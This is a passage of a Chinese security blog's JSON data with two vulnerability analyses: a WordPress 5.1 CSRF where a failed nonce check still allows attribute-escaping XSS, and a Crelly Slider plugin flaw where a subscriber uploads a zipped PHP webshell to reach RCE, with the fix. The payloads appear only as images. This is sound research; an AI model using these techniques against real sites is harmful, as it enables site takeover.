-&gt;wp_filter_post_kses</p>\n<p>普通用户 –&gt;wp_filter_kses</p>\n<p>&nbsp;</p>\n<p>先来看看普通用户提交和超级管理员无nonce提交时调用的过滤函数有什么区别</p>\n<p>&nbsp;</p>\n<p>普通用户提交过滤函数：</p>\n<img class=\"alignnone size-full wp-image-14771\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/11-2.png\" alt=\"\" width=\"780\" height=\"60\" />\n\n<p>&nbsp;</p>\n<p>超级管理员无nonce提交过滤函数：</p>\n<img class=\"alignnone size-full wp-image-14772\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/12-1.png\" alt=\"\" width=\"808\" height=\"62\" />\n\n<p>&nbsp;</p>\n<p>可以看出只是wp_kses中第二个参数不同，一个是current_filter()，一个是’post’</p>\n<p>这里不同的，对应wp_kses中，应该是allowed_html参数值</p>\n<p>&nbsp;</p>\n<p>这里举个普通用户评论的例子，普通用户提交评论，current_filter()方法返回的值是pre_comment_content，也就是说allowed_html参数值为pre_comment_content。可见下图动态调试结果</p>\n<img class=\"alignnone size-full wp-image-14773\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/13.png\" alt=\"\" width=\"903\" height=\"345\" />\n\n<p>对应的，超级管理员无nonce提交时，这里的allowed_html参数值为”post”</p>\n<p>&nbsp;</p>\n<p>那么allowed_html值不同，到底会有什么区别呢？</p>\n<p>$allowed_html被传入wp_kses_split方法</p>\n<img class=\"alignnone size-full wp-image-14774\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/14-1.png\" alt=\"\" width=\"812\" height=\"167\" />\n\n<p>&nbsp;</p>\n<p>进一步看wp_kses_split</p>\n<img class=\"alignnone size-full wp-image-14776\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/15-1.png\" alt=\"\" width=\"822\" height=\"153\" />\n\n<p>注意到这里$pass_allowed_html = $allowed_html;</p>\n<p>现在$allowed_html传给了$pass_allowed_html</p>\n<p>我们要看看这两个不同的$allowed_html最终传递到哪里被用到</p>\n<p>&nbsp;</p>\n<p>跟进_wp_kses_split_callback，$allowed_html传给了wp_kses_split2</p>\n<img class=\"alignnone size-full wp-image-14777\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/16-1.png\" alt=\"\" width=\"843\" height=\"88\" />\n\n<p>跟进wp_kses_split2，$allowed_html被传给了wp_kses_attr<img class=\"alignnone size-full wp-image-14778\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/17.png\" alt=\"\" width=\"711\" height=\"127\" /></p>\n<p>跟进wp_kses_attr，$allowed_html被传给了wp_kses_allowed_html</p>\n<img class=\"alignnone size-full wp-image-14780\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/18-1.png\" alt=\"\" width=\"755\" height=\"147\" />\n\n<p>跟进wp_kses_allowed_html</p>\n<p>一路跟踪，到了这里，$allowed_html终于有作用了</p>\n<img class=\"alignnone size-full wp-image-14790\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add.png\" alt=\"\" width=\"653\" height=\"141\" />\n\n<p>回顾一下，</p>\n<p>超级管理员无nonce提交时，这里的allowed_html参数值为”post”</p>\n<p>普通用户提交评论时， allowed_html参数值为”pre_comment_content”。</p>\n<p>首先看超级管理员无nonce提交吗，allowed_html参数值为”post”，进入post分支</p>\n<img class=\"alignnone size-full wp-image-14781\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/19-1.png\" alt=\"\" width=\"837\" height=\"131\" />\n\n<p>可以看到这里有一个wp_kses_allowed_html方法，跟进去看看<img class=\"alignnone size-full wp-image-14782\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/20-1.png\" alt=\"\" width=\"825\" height=\"399\" /></p>\n<p>相当于一个白名单机制，再看看白名单上都有什么，看看$allowedposttags</p>\n<img class=\"alignnone size-full wp-image-14783\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/21-1.png\" alt=\"\" width=\"320\" height=\"239\" />\n\n<p>这里’a’标签运行’rel’属性</p>\n<p>&nbsp;</p>\n<p>再看看普通用户提交评论时， allowed_html参数值为”pre_comment_content”情况。</p>\n<img class=\"alignnone size-full wp-image-14784\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/22-1.png\" alt=\"\" width=\"702\" height=\"84\" />\n\n<p>&nbsp;</p>\n<p>这里白名单是$allowedtags</p>\n<img class=\"alignnone size-full wp-image-14785\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/23.png\" alt=\"\" width=\"356\" height=\"178\" />\n\n<p>只允许’href’与’title’</p>\n<p>看到这里，明白wp_filter_post_kses 、wp_filter_ kses两个过滤函数有什么区别了吗？</p>\n<p>&nbsp;</p>\n<p>可以用’rel’属性与不可以用’rel’,有什么区别呢？如何造成这次的csrf呢？看下图</p>\n<p>wp-includes\\formatting.php</p>\n<img class=\"alignnone size-full wp-image-14786\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/24.png\" alt=\"\" width=\"853\" height=\"534\" />\n\n<p>可以看到属性值在没有被转义处理的情况下就再次拼接在一起，</p>\n<p>在a标签最终被拼接时，title的属性会被封装到双引号中，这样我们就可以构造数据使其闭合，从而执行js</p>\n<p>Payload：</p>\n<img class=\"alignnone size-full wp-image-14806\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add2.png\" alt=\"\" width=\"482\" height=\"51\" />\n\n<p>被双引号包裹后</p>\n<img class=\"alignnone size-full wp-image-14810\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add3-1.png\" alt=\"\" width=\"459\" height=\"36\" />\n\n<p>单鼠标放置时，js执行</p>\n<p>&nbsp;</p>\n<p>但是这个wp_rel_nofollow_callback哪里来的呢？</p>\n<p>&nbsp;</p>\n<p>看一下wordpress对comment_content都采用了哪些默认的过滤器</p>\n<p>&nbsp;</p>\n<p>\\wp-includes\\default-filters.php</p>\n<p><img class=\"alignnone size-full wp-image-14787\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/25.png\" alt=\"\" width=\"801\" height=\"42\" /> <img class=\"alignnone size-full wp-image-14788\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/26.png\" alt=\"\" width=\"782\" height=\"109\" /> 上图三个分别是：</p>\n<p>wp_rel_nofollow</p>\n<p>convert_invalid_entities</p>\n<p>balanceTags</p>\n<p>&nbsp;</p>\n<p>看下wp_rel_nofollow</p>\n<img class=\"alignnone size-full wp-image-14789\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/27.png\" alt=\"\" width=\"655\" height=\"139\" />\n\n<p>wp_rel_nofollow_callback是在这里被加载并使用的</p>\n<p>&nbsp;</p>\n<h2>结语</h2>\n最后，整理下流程\n\n<p>此次漏洞的流程是：</p>\n<p>(超级管理员&amp;不合法nonce) -&gt;(wp_filter_post_kses)-&gt;(’rel’属性在白名单中逃逸)-&gt;(wordpress加载默认评论内容过滤器wp_rel_nofollow)-&gt;(加载wp_rel_nofollow_callback) -&gt;(未过滤并用双引号包裹title值)-&gt;(js执行)-&gt;(RCE)</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/拖库1.jpg","excerpt":"<p>WordPress是使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。也可以把 WordPress当作一个内容管理系统（CMS）来使用。<br>前些日子，RIPS放了一个WordPress5.1的CSRF漏洞通过<br>本文将对此次CSRF漏洞进行详细分析，RCE相关的分析见后续分析文章</p>","more":"<h2>预备知识</h2>\n在wordpress中，超级管理员是可以在评论中写入任何代码而不被过滤的\n\n<p>比如，在评论中输入</p>\n<img class=\"alignnone size-full wp-image-14805\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add1.png\" alt=\"\" width=\"420\" height=\"53\" />\n\n<img class=\"alignnone size-full wp-image-14760\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/1-1.png\" alt=\"\" width=\"741\" height=\"374\" />\n\n<p>直接弹框<br>&nbsp;</p>\n<p>但是超级管理员在提交评论表单时，wordpress需要校验其Nonce值</p>\n<p>想理解这个漏洞，首先要了解下wordpress的Nonce ( number used once )防御机制</p>\n<p>Wordpress的Nonce ( number used once ) 机制，是用来防止CSRF而引进的。WordPress会为一些请求提供一个随机数进行校验，以防止未授权的请求的发生。</p>\n<p>&nbsp;</p>\n<p>来看下wordpress的Nonce机制是如何使用的:</p>\n<p>1、使用wp_create_nonce生成 nonce值：</p>\n<img class=\"alignnone size-full wp-image-14762\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/2-1.png\" alt=\"\" width=\"756\" height=\"483\" />\n\n<p>可见，其实nonce值与$i、$action、$uid、$token有关</p>\n<p>这里的$i 是nonce创建的时间相关变量，由wp_nonce_tick()生成，其余的$action、$uid、$token很好理解。</p>\n<p>由这里我们可以看出，nonce的生成，与其操作也是有关系的</p>\n<p>&nbsp;</p>\n<p>2、将生成的 nonce传递给需要提交时验证的前端模板</p>\n<p>3、需要验证的表单被提交后，验证其中nonce，例如下图中，本次漏洞点</p>\n<img class=\"alignnone size-full wp-image-14763\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/3-1.png\" alt=\"\" width=\"832\" height=\"180\" />\n\n<p>Nonce讲解完毕，言归正传，分析本次漏洞</p>\n<h2>漏洞分析</h2>\n理论上，如果没法通过Nonce验证，后续的操作会直接被终止，而且在csrf攻击中，攻击者是没有办法伪造管理员实时的Nonce值。\n\n<p>但从本次漏洞处来看，如下图</p>\n<img class=\"alignnone size-full wp-image-14764\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/4-1.png\" alt=\"\" width=\"771\" height=\"140\" />\n\n<p>这里虽然没有通过Nonce的验证（wp_verify_nonce）,但是并未终止操作。Wordpress在这里使用了两个过滤方法对后续的数据进行过滤。</p>\n<p>&nbsp;</p>\n<p>至于为什么没有终止，而采用了如下的过滤逻辑，据说是因为WordPress其中有一些特殊的功能例如trackbacks and pingbacks会受到该值的影响，笔者没有进一步考究，感兴趣的同学可以自己分析下。</p>\n<p>&nbsp;</p>\n<p>到目前为止，我们虽然没有合法的nonce值，但我们的payload仍然幸存，</p>\n<p>接下来，看看逻辑里的 kses_init_filters()这个方法</p>\n<img class=\"alignnone size-full wp-image-14765\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/5-1.png\" alt=\"\" width=\"718\" height=\"200\" />\n\n<p>&nbsp;</p>\n<h3>超级管理员&amp;非法Nonce情况:</h3>\n我们用超级管理员身份提交一个评论，但是改包，把&amp;_wp_unfiltered_html_comment改为空，使其通过不了Nonce校验，如下图\n\n<img class=\"alignnone size-full wp-image-14766\" title=\"\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/6-1.png\" alt=\"\" width=\"1139\" height=\"433\" />\n\n<p>&nbsp;</p>\n<p>果然进入下图断点</p>\n<img class=\"alignnone size-full wp-image-14767\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/7-1.png\" alt=\"\" width=\"805\" height=\"144\" />\n\n<p>&nbsp;</p>\n<p>紧接着，进入如下断点</p>\n<img class=\"alignnone size-full wp-image-14768\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/8-1.png\" alt=\"\" width=\"754\" height=\"223\" />\n\n<p>使用wp_filter_post_kses对输入的数据进行过滤</p>\n<p>&nbsp;</p>\n<h3>普通用户情况：</h3>\n此时用普通用户进行评论\n\n<img class=\"alignnone size-full wp-image-14769\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/9-1.png\" alt=\"\" width=\"728\" height=\"539\" />\n\n<img class=\"alignnone size-full wp-image-14770\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/10-1.png\" alt=\"\" width=\"698\" height=\"195\" />\n\n<p>直接调用wp_filter_kses进行过滤</p>\n<p>&nbsp;</p>\n<p>以上思路以及明朗了</p>\n<p>超级管理员&amp;合法nonce -&gt;不做任何过滤</p>\n<p>超级管理员&amp;不合法nonce -&gt;wp_filter_post_kses</p>\n<p>普通用户 –&gt;wp_filter_kses</p>\n<p>&nbsp;</p>\n<p>先来看看普通用户提交和超级管理员无nonce提交时调用的过滤函数有什么区别</p>\n<p>&nbsp;</p>\n<p>普通用户提交过滤函数：</p>\n<img class=\"alignnone size-full wp-image-14771\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/11-2.png\" alt=\"\" width=\"780\" height=\"60\" />\n\n<p>&nbsp;</p>\n<p>超级管理员无nonce提交过滤函数：</p>\n<img class=\"alignnone size-full wp-image-14772\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/12-1.png\" alt=\"\" width=\"808\" height=\"62\" />\n\n<p>&nbsp;</p>\n<p>可以看出只是wp_kses中第二个参数不同，一个是current_filter()，一个是’post’</p>\n<p>这里不同的，对应wp_kses中，应该是allowed_html参数值</p>\n<p>&nbsp;</p>\n<p>这里举个普通用户评论的例子，普通用户提交评论，current_filter()方法返回的值是pre_comment_content，也就是说allowed_html参数值为pre_comment_content。可见下图动态调试结果</p>\n<img class=\"alignnone size-full wp-image-14773\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/13.png\" alt=\"\" width=\"903\" height=\"345\" />\n\n<p>对应的，超级管理员无nonce提交时，这里的allowed_html参数值为”post”</p>\n<p>&nbsp;</p>\n<p>那么allowed_html值不同，到底会有什么区别呢？</p>\n<p>$allowed_html被传入wp_kses_split方法</p>\n<img class=\"alignnone size-full wp-image-14774\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/14-1.png\" alt=\"\" width=\"812\" height=\"167\" />\n\n<p>&nbsp;</p>\n<p>进一步看wp_kses_split</p>\n<img class=\"alignnone size-full wp-image-14776\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/15-1.png\" alt=\"\" width=\"822\" height=\"153\" />\n\n<p>注意到这里$pass_allowed_html = $allowed_html;</p>\n<p>现在$allowed_html传给了$pass_allowed_html</p>\n<p>我们要看看这两个不同的$allowed_html最终传递到哪里被用到</p>\n<p>&nbsp;</p>\n<p>跟进_wp_kses_split_callback，$allowed_html传给了wp_kses_split2</p>\n<img class=\"alignnone size-full wp-image-14777\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/16-1.png\" alt=\"\" width=\"843\" height=\"88\" />\n\n<p>跟进wp_kses_split2，$allowed_html被传给了wp_kses_attr<img class=\"alignnone size-full wp-image-14778\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/17.png\" alt=\"\" width=\"711\" height=\"127\" /></p>\n<p>跟进wp_kses_attr，$allowed_html被传给了wp_kses_allowed_html</p>\n<img class=\"alignnone size-full wp-image-14780\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/18-1.png\" alt=\"\" width=\"755\" height=\"147\" />\n\n<p>跟进wp_kses_allowed_html</p>\n<p>一路跟踪，到了这里，$allowed_html终于有作用了</p>\n<img class=\"alignnone size-full wp-image-14790\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add.png\" alt=\"\" width=\"653\" height=\"141\" />\n\n<p>回顾一下，</p>\n<p>超级管理员无nonce提交时，这里的allowed_html参数值为”post”</p>\n<p>普通用户提交评论时， allowed_html参数值为”pre_comment_content”。</p>\n<p>首先看超级管理员无nonce提交吗，allowed_html参数值为”post”，进入post分支</p>\n<img class=\"alignnone size-full wp-image-14781\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/19-1.png\" alt=\"\" width=\"837\" height=\"131\" />\n\n<p>可以看到这里有一个wp_kses_allowed_html方法，跟进去看看<img class=\"alignnone size-full wp-image-14782\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/20-1.png\" alt=\"\" width=\"825\" height=\"399\" /></p>\n<p>相当于一个白名单机制，再看看白名单上都有什么，看看$allowedposttags</p>\n<img class=\"alignnone size-full wp-image-14783\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/21-1.png\" alt=\"\" width=\"320\" height=\"239\" />\n\n<p>这里’a’标签运行’rel’属性</p>\n<p>&nbsp;</p>\n<p>再看看普通用户提交评论时， allowed_html参数值为”pre_comment_content”情况。</p>\n<img class=\"alignnone size-full wp-image-14784\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/22-1.png\" alt=\"\" width=\"702\" height=\"84\" />\n\n<p>&nbsp;</p>\n<p>这里白名单是$allowedtags</p>\n<img class=\"alignnone size-full wp-image-14785\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/23.png\" alt=\"\" width=\"356\" height=\"178\" />\n\n<p>只允许’href’与’title’</p>\n<p>看到这里，明白wp_filter_post_kses 、wp_filter_ kses两个过滤函数有什么区别了吗？</p>\n<p>&nbsp;</p>\n<p>可以用’rel’属性与不可以用’rel’,有什么区别呢？如何造成这次的csrf呢？看下图</p>\n<p>wp-includes\\formatting.php</p>\n<img class=\"alignnone size-full wp-image-14786\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/24.png\" alt=\"\" width=\"853\" height=\"534\" />\n\n<p>可以看到属性值在没有被转义处理的情况下就再次拼接在一起，</p>\n<p>在a标签最终被拼接时，title的属性会被封装到双引号中，这样我们就可以构造数据使其闭合，从而执行js</p>\n<p>Payload：</p>\n<img class=\"alignnone size-full wp-image-14806\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add2.png\" alt=\"\" width=\"482\" height=\"51\" />\n\n<p>被双引号包裹后</p>\n<img class=\"alignnone size-full wp-image-14810\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add3-1.png\" alt=\"\" width=\"459\" height=\"36\" />\n\n<p>单鼠标放置时，js执行</p>\n<p>&nbsp;</p>\n<p>但是这个wp_rel_nofollow_callback哪里来的呢？</p>\n<p>&nbsp;</p>\n<p>看一下wordpress对comment_content都采用了哪些默认的过滤器</p>\n<p>&nbsp;</p>\n<p>\\wp-includes\\default-filters.php</p>\n<p><img class=\"alignnone size-full wp-image-14787\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/25.png\" alt=\"\" width=\"801\" height=\"42\" /> <img class=\"alignnone size-full wp-image-14788\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/26.png\" alt=\"\" width=\"782\" height=\"109\" /> 上图三个分别是：</p>\n<p>wp_rel_nofollow</p>\n<p>convert_invalid_entities</p>\n<p>balanceTags</p>\n<p>&nbsp;</p>\n<p>看下wp_rel_nofollow</p>\n<img class=\"alignnone size-full wp-image-14789\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/27.png\" alt=\"\" width=\"655\" height=\"139\" />\n\n<p>wp_rel_nofollow_callback是在这里被加载并使用的</p>\n<p>&nbsp;</p>\n<h2>结语</h2>\n最后，整理下流程\n\n<p>此次漏洞的流程是：</p>\n<p>(超级管理员&amp;不合法nonce) -&gt;(wp_filter_post_kses)-&gt;(’rel’属性在白名单中逃逸)-&gt;(wordpress加载默认评论内容过滤器wp_rel_nofollow)-&gt;(加载wp_rel_nofollow_callback) -&gt;(未过滤并用双引号包裹title值)-&gt;(js执行)-&gt;(RCE)</p>"},{"title":"WordPress Crelly Slider插件从任意文件上传到RCE","date":"2019-11-25T10:19:35.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n<!--[![Mv8Kbt.md.jpg](https://s2.ax1x.com/2019/11/25/Mv8Kbt.md.jpg)](https://imgchr.com/i/Mv8Kbt)\n\n-->\n\nWordPress Crelly Slider是一个开源的幻灯片插件。用户可以使用强大的拖放生成器来添加文本、图像、youtube/vimeo视频，并为每个视频制作动画。\n\nWordPress Crelly Slider插件具有20,000多个活动安装。该插件在1.3.4及更低版本中出现任意文件上传漏洞。任意经过身份验证的用户（例如订阅者身份）可通过向wp_ajax_crellyslider_importSlider发送带有恶意PHP文件的ZIP压缩文件来利用该漏洞上传文件并将恶意PHP文件解压到插件目录中。\n\n<!--more-->\n\n漏洞分析\n--------\n\n在crelly-slider\\\\crellyslider.php文件中，存在如下代码\n\n![MvlV3j.png](https://s2.ax1x.com/2019/11/25/MvlV3j.png)\n\n位于上图45行处可见，插件使用if(is_admin())进行判断，满足条件则可以进入上图if分支，并且在58行处将wordpress/ajax.php文件包含进来\n\n接着来分析下ajax.php文件\n\n在crelly-slider/wordpress/ajax.php中存在如下代码\n\n![MvluD0.png](https://s2.ax1x.com/2019/11/25/MvluD0.png)\n\n可见上图520行处注册了一个名为wp_ajax_crellyslider_importSlider 的ajax action并指向ajax.php中的crellyslider_importSlider_callback方法。\n\n在wordpress插件调用机制里，crellyslider_importSlider_callback方法可以通过构造”http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=crellyslider_importSlider”这样的url来访问\n\n具体调用链如下\n\n![Mvl9DP.png](https://s2.ax1x.com/2019/11/25/Mvl9DP.png)\n\n在搞清楚crellyslider_importSlider_callback方法是如何通过url调用后，继续分析crellyslider_importSlider_callback方法\n\n在crellyslider_importSlider_callback方法中523行处使用crellyslider_importSlider方法来处理上传文件，如下图\n\n![MvQj9H.png](https://s2.ax1x.com/2019/11/25/MvQj9H.png)\n\n接着来看下crellyslider_importSlider方法\n\n![Mvlevn.png](https://s2.ax1x.com/2019/11/25/Mvlevn.png)\n\ncrellyslider_importSlider方法将上传zip文件解压，并将解压后的文件存储于/wordpress/temp/路径中，如上图553行红框处\n\n现在梳理一下上文介绍的流程：\n\ncrelly-slider插件将使用is_admin()方法验证用户是否有使用crellyslider_importSlider_callback方法的使用权限。通过is_admin()方法验证的用户则可以使用crellyslider_importSlider_callback方法上传任意zip压缩包，程序将上传的压缩包中的文件解压至/wordpress/temp/路径。\n\n能使整个流程执行的前提是通过is_admin()的校验。但是is_admin()方法具体是做什么的呢？它是否像字面上看起来的那样：判断用户是否是管理员身份吗？——答案是否定的。\n\nis_admin方法只是用来确定当前请求是否是针对管理界面页面。使用if(is_admin())只是为了确保if条件中的代码在后端管理界面加载，而不会再前台管理界面加载\n\nis_admin方法并没有核实用户是否是管理员身份的能力，其代码如下图:\n\n![Mvlput.png](https://s2.ax1x.com/2019/11/25/Mvlput.png)\n\n因此crelly-slider插件开发者误用了is_admin方法，错误的将其用来判断当前操作的用户身份是否为管理员身份。\n\n事实上，只要是是后台文件，都会定义WP_ADMIN常量为true，例如本次漏洞的入口：wp-admin/admin-ajax.php文件，如下图\n\n![MvQv3d.png](https://s2.ax1x.com/2019/11/25/MvQv3d.png)\n\n可见上图17-19行，使用常量WP_ADMIN来标识这是一个后台文件\n\n这就导致了无论什么身份的用户，只要访问后台文件，is_admin方法都会返回true\n\n我们新建一个名为subscriber的用户，其权限为订阅者权限(subscriber)\n\n![MvlCHf.png](https://s2.ax1x.com/2019/11/25/MvlCHf.png)\n\n在wordpress中，订阅者权限具有极低的权限：\n\n“具有订阅者用户角色的用户可以登录WordPress站点并更新自己的配置。他们可以根据需要更改密码。订阅者用户角色无法在WordPress管理后台内撰写文章，查看评论或执行任何其他操作。订阅者用户角色无权访问设置，插件或主题，因此无法更改网站上的任何设置”\n\n订阅者wordpress管理页面如下\n\n![MvlZgs.png](https://s2.ax1x.com/2019/11/25/MvlZgs.png)\n\ncrelly-slider插件开发者的本意是希望”is_admin”用户拥有调用crellyslider_importSlider ajax接口的权限，但实际上，subscriber身份的用户仍有权限使用crellyslider_importSlider ajax接口上传压缩包并将其中内容解压到/wordpress/temp/路径中\n\n在我们构造的webshell.php文件中写入如下代码\n\n![MvlECQ.png](https://s2.ax1x.com/2019/11/25/MvlECQ.png)\n\n并将其压缩至webshell.zip中\n\n![Mvlnuq.png](https://s2.ax1x.com/2019/11/25/Mvlnuq.png)\n\n使用subscriber身份的用户的cookie，发送如下POST请求\n\n![Mvlk4g.png](https://s2.ax1x.com/2019/11/25/Mvlk4g.png)\n\nwebshell.zip 中的webshell.php将会被解压到wordpress\\\\temp目录下，如下图\n\n![MvQxgA.png](https://s2.ax1x.com/2019/11/25/MvQxgA.png)\n\n通过访问这个地址，webshell.php中的内容将会被执行\n\n## 漏洞修复\n\n关于本次漏洞的修复如下：\n\n在crellyslider.php中定义了一个值为manage_options的CS_MIN_CAPABILITY常量\n\n![MvQO4e.png](https://s2.ax1x.com/2019/11/25/MvQO4e.png)\n\n在crellyslider.php调用ajax.php中crellyslider_addSlider_callback方法时，调用current_user_can方法验证当前用户是否具有manage_options权限，如下图\n\n![MvlFUS.png](https://s2.ax1x.com/2019/11/25/MvlFUS.png)\n\n这样就可以避免没有访问插件和主题选项页面权限的用户身份(例如订阅者身份)调用crellyslider_addSlider_callback方法上传文件。","source":"_posts/wordpress-crelly-slider.md","raw":"---\ntitle: WordPress Crelly Slider插件从任意文件上传到RCE\ndate: 2019-11-25 18:19:35\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n<!--[![Mv8Kbt.md.jpg](https://s2.ax1x.com/2019/11/25/Mv8Kbt.md.jpg)](https://imgchr.com/i/Mv8Kbt)\n\n-->\n\nWordPress Crelly Slider是一个开源的幻灯片插件。用户可以使用强大的拖放生成器来添加文本、图像、youtube/vimeo视频，并为每个视频制作动画。\n\nWordPress Crelly Slider插件具有20,000多个活动安装。该插件在1.3.4及更低版本中出现任意文件上传漏洞。任意经过身份验证的用户（例如订阅者身份）可通过向wp_ajax_crellyslider_importSlider发送带有恶意PHP文件的ZIP压缩文件来利用该漏洞上传文件并将恶意PHP文件解压到插件目录中。\n\n<!--more-->\n\n漏洞分析\n--------\n\n在crelly-slider\\\\crellyslider.php文件中，存在如下代码\n\n![MvlV3j.png](https://s2.ax1x.com/2019/11/25/MvlV3j.png)\n\n位于上图45行处可见，插件使用if(is_admin())进行判断，满足条件则可以进入上图if分支，并且在58行处将wordpress/ajax.php文件包含进来\n\n接着来分析下ajax.php文件\n\n在crelly-slider/wordpress/ajax.php中存在如下代码\n\n![MvluD0.png](https://s2.ax1x.com/2019/11/25/MvluD0.png)\n\n可见上图520行处注册了一个名为wp_ajax_crellyslider_importSlider 的ajax action并指向ajax.php中的crellyslider_importSlider_callback方法。\n\n在wordpress插件调用机制里，crellyslider_importSlider_callback方法可以通过构造”http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=crellyslider_importSlider”这样的url来访问\n\n具体调用链如下\n\n![Mvl9DP.png](https://s2.ax1x.com/2019/11/25/Mvl9DP.png)\n\n在搞清楚crellyslider_importSlider_callback方法是如何通过url调用后，继续分析crellyslider_importSlider_callback方法\n\n在crellyslider_importSlider_callback方法中523行处使用crellyslider_importSlider方法来处理上传文件，如下图\n\n![MvQj9H.png](https://s2.ax1x.com/2019/11/25/MvQj9H.png)\n\n接着来看下crellyslider_importSlider方法\n\n![Mvlevn.png](https://s2.ax1x.com/2019/11/25/Mvlevn.png)\n\ncrellyslider_importSlider方法将上传zip文件解压，并将解压后的文件存储于/wordpress/temp/路径中，如上图553行红框处\n\n现在梳理一下上文介绍的流程：\n\ncrelly-slider插件将使用is_admin()方法验证用户是否有使用crellyslider_importSlider_callback方法的使用权限。通过is_admin()方法验证的用户则可以使用crellyslider_importSlider_callback方法上传任意zip压缩包，程序将上传的压缩包中的文件解压至/wordpress/temp/路径。\n\n能使整个流程执行的前提是通过is_admin()的校验。但是is_admin()方法具体是做什么的呢？它是否像字面上看起来的那样：判断用户是否是管理员身份吗？——答案是否定的。\n\nis_admin方法只是用来确定当前请求是否是针对管理界面页面。使用if(is_admin())只是为了确保if条件中的代码在后端管理界面加载，而不会再前台管理界面加载\n\nis_admin方法并没有核实用户是否是管理员身份的能力，其代码如下图:\n\n![Mvlput.png](https://s2.ax1x.com/2019/11/25/Mvlput.png)\n\n因此crelly-slider插件开发者误用了is_admin方法，错误的将其用来判断当前操作的用户身份是否为管理员身份。\n\n事实上，只要是是后台文件，都会定义WP_ADMIN常量为true，例如本次漏洞的入口：wp-